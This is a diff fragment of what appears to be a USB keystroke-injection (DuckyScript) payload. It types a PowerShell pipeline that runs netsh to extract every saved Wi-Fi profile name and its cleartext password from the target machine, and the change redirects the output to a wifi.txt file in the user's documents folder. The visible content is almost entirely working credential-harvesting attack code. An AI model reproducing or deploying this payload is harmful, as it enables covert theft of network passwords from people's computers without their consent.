@@ -14,7 +14,7 @@ STRING  %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show prof
 STRING  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
 REM file location
 STRING  | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} >
-STRING $home\documents
+STRING $home\documents\wifi.txt
 REM Z:\data\wifi.txt
 ENTER
 
